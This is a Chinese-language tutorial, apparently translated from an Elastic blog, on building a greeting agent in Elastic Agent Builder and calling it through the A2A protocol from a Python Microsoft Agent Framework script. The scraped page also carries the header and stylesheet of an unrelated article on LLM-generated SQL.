<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f795dec328184949b4ca1a878f906086~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=IeE4iZ2pPR7lQvQCsTfhZU7jtOU%3D" alt="" loading="lazy"/></p>
<p>然后点击 Manage tools。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4be79f7ee762471588354922a413420a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=uSYQXw3TsINQawcf6tcrSsfOw8c%3D" alt="" loading="lazy"/></p>
<p>点击 + New tool 按钮。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0dcbda00590748ed9a0d6bd43dba5e57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=SGxwM%2F5j4z34HuiNcVpw5x7o%2FLA%3D" alt="" loading="lazy"/></p>
<p>在 Create Tool 表单中，选择 ES|QL 作为 tool Type，并输入以下值。</p>
<p><strong>Tool ID</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`example.get_greetings`</span>AI写代码
</code></pre>
<p><strong>Description</strong>：</p>
<pre><code class="hljs language-sql" lang="sql">`<span class="hljs-keyword">Get</span> greetings doc <span class="hljs-keyword">from</span> Elasticsearch my_docs index.`AI写代码
</code></pre>
<p><strong>Configuration</strong>：在 ES|QL Query 文本区域中输入以下查询：</p>
<pre><code class="hljs language-ini" lang="ini">`FROM my-docs | WHERE <span class="hljs-attr">filename</span> == <span class="hljs-string">"greetings.md"</span>`AI写代码
</code></pre>
<p>你完成的 Create a new tool 表单应如下所示。点击 Save 创建该 tool。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd7b2dba5b034284a21afdd127023f2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=AeFPT%2Fh5SfNrlEw3Ux7mvQT6ie8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">创建一个 Agent 并为其分配一个 tool</h2>
<p>啊！有了新 tool 并准备使用的感觉真好。Agents 需要 tools 来赋予它们超出一般 LLM 能力的特殊功能，而我们现在有了一个全新的 tool。让我们创建一个可以充分利用我们 tool 的 agent。在导航菜单中选择 Agents。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5017f7bf2d6343a2ab9358ecbf0de508~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=b%2B8xWmBlJReUS4EKfz9%2F4lTF9kc%3D" alt="" loading="lazy"/></p>
<p>点击 Create a new agent。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d985de944f04cf79001770bdb005183~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=fosa7HZKNd7e%2FtFgh31Z436yVjs%3D" alt="" loading="lazy"/></p>
<p>根据 tool 的名称和它访问的数据，你可能已经猜到我们要创建一个问候 agent，你猜对了！让我们现在创建一个 Hello World agent。</p>
<p>在 New Agent 表单中，输入以下值。</p>
<p><strong>Agent ID</strong>：输入文本：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`helloworld_agent`</span>AI写代码
</code></pre>
<p>在 <strong>Custom Instructions</strong> 文本区域中输入以下指令：</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  If the prompt <span class="hljs-keyword">contains</span> greeting text <span class="hljs-keyword">like</span> "Hi" <span class="hljs-keyword">or</span> "Hello" <span class="hljs-keyword">then</span> respond <span class="hljs-keyword">with</span> <span class="hljs-keyword">only</span> the Basic Hello text <span class="hljs-keyword">from</span> your documents.

<span class="hljs-number">3.</span>  If the prompt <span class="hljs-keyword">contains</span> the text “Hello World” <span class="hljs-keyword">then</span> respond <span class="hljs-keyword">with</span> <span class="hljs-keyword">only</span> the Hello World text <span class="hljs-keyword">from</span> your documents.

<span class="hljs-number">5.</span>  <span class="hljs-keyword">In</span> <span class="hljs-keyword">all</span> other cases <span class="hljs-keyword">where</span> the prompt does <span class="hljs-keyword">not</span> contain greeting words, <span class="hljs-keyword">then</span> respond <span class="hljs-keyword">with</span> <span class="hljs-keyword">only</span> the <span class="hljs-keyword">Not</span> Greeting text <span class="hljs-keyword">from</span> your documents.

`AI写代码
</code></pre>
<p><strong>Display name</strong>：输入文本：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`HelloWorld Agent`</span>AI写代码
</code></pre>
<p><strong>Display description</strong>：输入文本：</p>
<pre><code class="hljs language-css" lang="css">`An agent that responds <span class="hljs-selector-tag">to</span> greetings.`AI写代码
</code></pre>
<p>你完成的 <strong>New Agent</strong> 表单应如下所示。下一步是为 agent 分配我们在上一步创建的 tool。点击 <strong>Tools</strong> 标签。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2928610d469b4f239c161d86e86804aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=hUJZPj5vxVr1qYtC3kaiP1CYrwE%3D" alt="" loading="lazy"/></p>
<p>只选择我们之前创建的 example.get_greetings tool。取消选择所有其他可用的 tools。这将配置正在创建的 agent 仅能访问我们创建的 tool。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c721718bf9ec4b40bcf188d59bf9774c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=TQd0QyujnA1AniH%2Fb8RQ%2BCA2lZE%3D" alt="" loading="lazy"/></p>
<p>点击 <strong>Save</strong> 创建该 agent。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d5ec24af7af4120a55faa92315e6f5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=xPsKPYZuIowxpotZNEknI3NSJ8o%3D" alt="" loading="lazy"/></p>
<p>你将被带到 Agents 列表，在那里可以看到新的 HelloWorld Agent 已经创建。我们可以在 Agent Builder 中快速测试我们的新 agent。在导航菜单中选择 Agents。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ab5fe1716b843bda92ca29fce18144a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=zSBhYbP%2F4wrlDSMO8MmEnBJIb4s%3D" alt="" loading="lazy"/></p>
<p>在 Agent Chat agent 选择器中选择 HelloWorld Agent。输入提示 “hello world”，你应该会从存储在 my-docs Elastic 索引中的 greetings.md 文档中得到 Hello World 文本。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcb09d6d4c534b60932b7d0c7ed40b40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=SmMPirV7gu%2BvXWLbgLxxPgIIcDY%3D" alt="" loading="lazy"/></p>
<p>干得好。现在我们知道我们的 agent 按预期工作，让我们探索在 Agent Builder 中创建的 tools 和 agents 带来的即时开发好处。你在 Agent Builder 中创建的任何 tools 都可以通过 MCP 被任何支持 MCP 的 agent 构建平台使用。同时，你在 Agent Builder 中创建的任何 agents 都可以在任何支持 AgentToAgent (A2A) 协议的 agent 构建平台中使用。</p>
<h2 data-id="heading-4">Microsoft Agent Framework</h2>
<p>如果你有兴趣尝试新的 Agent 开发工具，那么最近宣布的开源开发工具包 <a href="https://link.juejin.cn?target=https%3A%2F%2Flearn.microsoft.com%2Fen-us%2Fagent-framework%2Foverview%2Fagent-framework-overview" title="https://learn.microsoft.com/en-us/agent-framework/overview/agent-framework-overview" target="_blank" ref="nofollow noopener noreferrer">Microsoft Agent Framework</a> 你绝对应该亲自尝试。Agent Framework 允许你使用 A2A 协议来编排 agent 应用，可以组合在不同主机上运行的多个 agents，从而实现仅靠通用 GenAI Large Language Model 无法实现的解决方案。Agent Framework 提供 Python 和 C# 版本。让我们看看如何使用基于 Python 的 Agent Framework 调用我们刚创建的自定义 Elastic Agent。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/311fb06b0c614586bb26a53b6a96af79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=Bzs94%2BOuTFe04%2BhVGsDP%2FMEnX%2FI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">在 Python 中开始使用 Agent Framework</h2>
<p>让我们运行一些代码！在你的本地电脑上打开 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2Fdownload" title="https://code.visualstudio.com/download" target="_blank" ref="nofollow noopener noreferrer">Visual Studio Code</a> 并打开一个新的终端。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/198375dc5d2e453c8eb1c58610cfeb11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=hZUoZ9K3LXmkugUcvgPo3ufgByg%3D" alt="" loading="lazy"/></p>
<p>在打开的终端中，克隆包含 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felastic%2Felasticsearch-labs%2Ftree%2Fmain%2Fsupporting-blog-content%2Fagent-builder-a2a-agent-framework" title="https://github.com/elastic/elasticsearch-labs/tree/main/supporting-blog-content/agent-builder-a2a-agent-framework" target="_blank" ref="nofollow noopener noreferrer">Elastic Agent Builder A2A 示例应用</a>的 Elastic Search Labs 源代码仓库。</p>
<pre><code class="hljs language-bash" lang="bash">`git <span class="hljs-built_in">clone</span> https://github.com/elastic/elasticsearch-labs`AI写代码
</code></pre>
<p>在终端中，使用 cd 命令切换目录到 elasticsearch-labs。</p>
<pre><code class="hljs language-bash" lang="bash">`<span class="hljs-built_in">cd</span> elasticsearch-labs`AI写代码
</code></pre>
<p>在终端中，输入以下命令以在 Visual Studio Code 编辑器中打开当前文件夹。</p>
<pre><code class="hljs language-css" lang="css">`<span class="hljs-selector-tag">code</span> .`AI写代码
</code></pre>
<p>在 Visual Studio 文件资源管理器中，展开 supporting-blog-content 和 agent-builder-a2a-agent-framework 文件夹，然后在文本编辑器中打开名为 elastic_agent_builder_a2a.py 的文件。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1651e1e6031f45559a4012b352edd887~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=KveKCpM6ZfqGwDZ0ue5ZqQFwF0k%3D" alt="" loading="lazy"/></p>
<p>这是你在文本编辑器中应该看到的 elastic_agent_builder_a2a.py 的内容：</p>
<pre><code class="hljs language-ini" lang="ini">`

1.  import asyncio
2.  from dotenv import load_dotenv
3.  import httpx
4.  import os
5.  from a2a.client import A2ACardResolver
6.  from agent_framework.a2a import A2AAgent

9.  async def main():
10.      load_dotenv()
<span class="hljs-attr">11.      a2a_agent_host</span> = os.getenv(<span class="hljs-string">"ES_AGENT_URL"</span>)
<span class="hljs-attr">12.      a2a_agent_key</span> = os.getenv(<span class="hljs-string">"ES_API_KEY"</span>)

14.      print(f"Connection to Elastic A2A agent at: {a2a_agent_host}")

<span class="hljs-attr">16.      custom_headers</span> = {<span class="hljs-string">"Authorization"</span>: f<span class="hljs-string">"ApiKey {a2a_agent_key}"</span>}

18.      async with httpx.AsyncClient(<span class="hljs-attr">timeout</span>=<span class="hljs-number">60.0</span>, headers=custom_headers) as http_client:
19.          <span class="hljs-comment"># Resolve the A2A Agent Card</span>
<span class="hljs-attr">20.          resolver</span> = A2ACardResolver(httpx_client=http_client, base_url=a2a_agent_host)
<span class="hljs-attr">21.          agent_card</span> = await resolver.get_agent_card(
<span class="hljs-attr">22.              relative_card_path</span>=<span class="hljs-string">"/helloworld_agent.json"</span>
23.          )
24.          print(f"Found Agent: {agent_card.name} - {agent_card.description}")

26.          <span class="hljs-comment"># Use the Agent</span>
<span class="hljs-attr">27.          agent</span> = A2AAgent(
<span class="hljs-attr">28.              name</span>=agent_card.name,
<span class="hljs-attr">29.              description</span>=agent_card.description,
<span class="hljs-attr">30.              agent_card</span>=agent_card,
<span class="hljs-attr">31.              url</span>=a2a_agent_host,
<span class="hljs-attr">32.              http_client</span>=http_client,
33.          )
<span class="hljs-attr">34.          prompt</span> = input(<span class="hljs-string">"Enter Greeting &gt;&gt;&gt; "</span>)
35.          print("\nSending message to Elastic A2A agent...")
<span class="hljs-attr">36.          response</span> = await agent.run(prompt)
37.          print("\nAgent Response:")
38.          for message in response.messages:
39.              print(message.text)

42.  if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
43.      asyncio.run(main())

`AI写代码!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>main() 方法中的代码演示了如何使用 Agent Framework 控制你的 Elastic Agent Builder agent。它使用来自你的 Elastic 项目的 URL 和 API key 为 agent 创建一个 http_client。然后调用 Agent Framework 的 A2ACardResolver，并传入该 http_client，以根据 relative_card_path 为 “/helloworld_agent.json” 获取 agent 的 A2A agent card，从而引用你的 agent 的 Agent ID，即 “helloworld_agent”。接着，代码使用 Agent Framework 调用你的 agent 并传入 A2A agent card。main() 方法的最后部分提示应用的用户输入一个 “greeting”，然后将用户输入作为提示发送给你的 agent。根据你创建 agent 时指定的指令和 tools，agent 的响应会显示给应用用户。</p>
<h2 data-id="heading-6">将你的 agent URL 和 API Key 设置为环境变量</h2>
<p>复制文件 env.example 并将新文件命名为 .env。编辑新创建的 .env 文件，将环境变量的值设置为从你的 Elastic 项目中复制的特定值。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9469770a5dca47b09693c7aa46067d90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=J5Uzv5MLL%2FbU7e5nmq9Bp3%2FVULA%3D" alt="" loading="lazy"/></p>
<p>首先，我们将 替换为你可以从 Elastic 项目中的 Agent Builder - Tools 页面复制的 Agent URL 路径。回到 Elastic Agent Builder，在导航菜单中点击 Agents。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/534f619664af4bf791846d2a8208e328~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=eoVGbnWNvggB8m9nF8t1Fse2T%2FE%3D" alt="" loading="lazy"/></p>
<p>选择 Manage tools。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b121e546060a489a81c7424be35243e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=1scXn%2FnXYZcAsyOuOudr1ve5DMA%3D" alt="" loading="lazy"/></p>
<p>点击 Tools 页面顶部的 MCP Server 下拉菜单。选择 Copy MCP Server URL。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05044a5651b24a86a366d653c0752979~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=xj6Xt%2F44qYoJirHe2jTJa64oyBE%3D" alt="" loading="lazy"/></p>
<p>回到 Visual Studio Code，在 .env 文件中找到占位符文本 “<strong>YOUR-ELASTIC-AGENT-BUILDER-URL&gt;</strong>”，并粘贴复制的 MCP Server URL 来替换占位符文本。现在编辑粘贴的 MCP Server URL。删除 URL 末尾的 “mcp” 文本，并替换为 “a2a”。编辑后的 URL 应该看起来像这样：</p>
<pre><code class="hljs language-bash" lang="bash">`https://example-project-a123.kb.westus2.azure.elastic.cloud/api/agent_builder/a2a`AI写代码
</code></pre>
<p>下一个需要在 .env 文件中替换的占位符文本是 。我们将用来自你的 Elastic 项目的实际 API Key 替换它。回到你的 Elastic 项目，在导航菜单中点击 Elasticsearch。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b2b86cd27784905849c2304808d5493~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=peXEnbb6%2F3PuGEDHrItEvTSjem8%3D" alt="" loading="lazy"/></p>
<p>点击 Create API key 创建一个新的 API key。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dbb46d8db094070bd110f7fdd5d7898~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=IYPENBjhPV0MMq5a5RoROTY6zHE%3D" alt="" loading="lazy"/></p>
<p>输入 API key 的 Name，然后点击 Create API key。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f834245ec3374a2895618490a85a64ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=hNUIUlTTwVtJiBjj%2FdMs%2BJp2CFY%3D" alt="" loading="lazy"/></p>
<p>点击复制按钮来复制 API key。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37b367a4c6b84a2cadbc0841747fbc81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=%2FsyDwD1DTJVvfbU9CKwZKDx0Qxw%3D" alt="" loading="lazy"/></p>
<p>回到 Visual Studio Code，在 .env 文件中找到占位符文本 “<strong/>”，并粘贴复制的 API Key 值来替换占位符文本。</p>
<p>现在我们可以保存对 .env 文件所做的更改。编辑后的文件应看起来像这样：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95372068b90a495499b4578ce6428ecf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=kKD16WypLILv%2B4KNXFIOEDyHTPc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">运行示例应用</h2>
<p>现在是运行代码的时候了。为此，在 Visual Studio Code 中打开一个新终端。点击顶部菜单的 Terminal，然后选择 New Terminal。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc40130777204bd6bc3dc1ecb5ccc31c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=xwJ4mRuJokjjDeooYc2QONj1kEg%3D" alt="" loading="lazy"/></p>
<p>在新终端中，使用 cd 命令切换目录到包含 agent-builder-a2a-agent-framework 示例应用的目录。</p>
<pre><code class="hljs language-bash" lang="bash">`<span class="hljs-built_in">cd</span> elasticsearch-labs/supporting-blog-content/agent-builder-a2a-agent-framework`AI写代码
</code></pre>
<p>在终端中，通过运行以下代码创建一个 Python 虚拟环境。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`python -m venv .venv`</span>AI写代码
</code></pre>
<p>在终端窗口中运行以下命令以激活虚拟环境（根据你的操作系统）：</p>
<ul>
<li>如果你使用的是 MacOS 或 Linux，激活虚拟环境的命令是：</li>
</ul>

<pre><code class="hljs language-bash" lang="bash">`<span class="hljs-built_in">source</span> .venv/bin/activate`AI写代码
</code></pre>
<p>如果你使用的是 Windows，激活虚拟环境的命令是：</p>
<pre><code class="hljs language-r" lang="r">`.venv\Scripts\activate`AI写代码
</code></pre>
<p>elastic_agent_builder_a2a.py 文件中的代码由 Microsoft Agent Framework 驱动，我们仍然需要安装它，所以现在来安装。运行以下 pip 命令以安装基于 Python 的 Agent Framework 及其所需的 Python 包：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`pip install -r requirements.txt`</span>AI写代码
</code></pre>
<p>太棒了！现在一切都已就绪。是时候体验那种美妙的感觉了……让我们运行它。在终端中输入以下命令运行示例代码：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`python elastic_agent_builder_a2a.py`</span>AI写代码
</code></pre>
<p>你应该会看到 Agent Framework 连接到 Elastic Agent。当提示输入 greeting 时，输入 “hello world”。你应该会看到 HelloWorld Agent 的响应 → Hello World! 🌎</p>
<p>顶尖的工作！</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a8870e7751f4c90a39578f5075491bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=7SVFOAZ9Wv%2F3mt5nnSNPU0l0UGU%3D" alt="" loading="lazy"/></p>
<p>在 Agent Builder 中构建 agents 并将它们连接到 tools，可以让你立即与最新的 agent 开发平台（如 Microsoft Agent Framework）实现可操作性。你现在已经知道如何创建一个 Elastic agent 并将其用作可扩展的相关数据源，随时为你接下来构建的所有 AI 应用提供自定义上下文。</p>
<p>今天就免费试用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration%3Futm_source%3Dagentic-ai-category%26utm_medium%3Dsearch-labs%26utm_campaign%3Dagent-builder" title="https://cloud.elastic.co/registration?utm_source=agentic-ai-category&amp;utm_medium=search-labs&amp;utm_campaign=agent-builder" target="_blank" ref="nofollow noopener noreferrer">Elastic</a> 并创建一些 agents 吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用 LLM 自动生成 SQL：从 SQLite Schema 到自然语言查询的完整实践]]></title>    <link>https://juejin.cn/post/7575102474640162867</link>    <guid>https://juejin.cn/post/7575102474640162867</guid>    <pubDate>2025-11-23T08:47:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102474640162867" data-draft-id="7574651025728110630" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用 LLM 自动生成 SQL：从 SQLite Schema 到自然语言查询的完整实践"/> <meta itemprop="keywords" content="全栈"/> <meta itemprop="datePublished" content="2025-11-23T08:47:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="玉宇夕落"/> <meta itemprop="url" content="https://juejin.cn/user/3323164053734988"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用 LLM 自动生成 SQL：从 SQLite Schema 到自然语言查询的完整实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3323164053734988/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    玉宇夕落
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:47:44.000Z" title="Sun Nov 23 2025 08:47:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid 